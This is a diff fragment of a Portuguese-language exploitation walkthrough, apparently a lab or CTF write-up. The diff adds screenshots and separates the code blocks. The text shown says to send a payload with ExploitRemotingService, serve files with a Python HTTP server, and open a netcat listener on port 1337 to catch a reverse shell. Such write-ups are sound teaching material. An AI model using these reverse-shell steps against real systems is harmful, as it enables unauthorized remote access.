@@ -174,8 +174,13 @@ Com o ExploitRemotingService enviaremos o nosso payload:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Ao enviar o payload, devemos ativar nosso servidor python e abrir uma porta em nossa máquina para receber a conexão de nossa shell.
+![Image](https://i.imgur.com/hCp7bvX.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 python -m SimpleHTTPServer 80
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+![Image](https://i.imgur.com/y3AYsaE.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 nc -vvnlp 1337
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
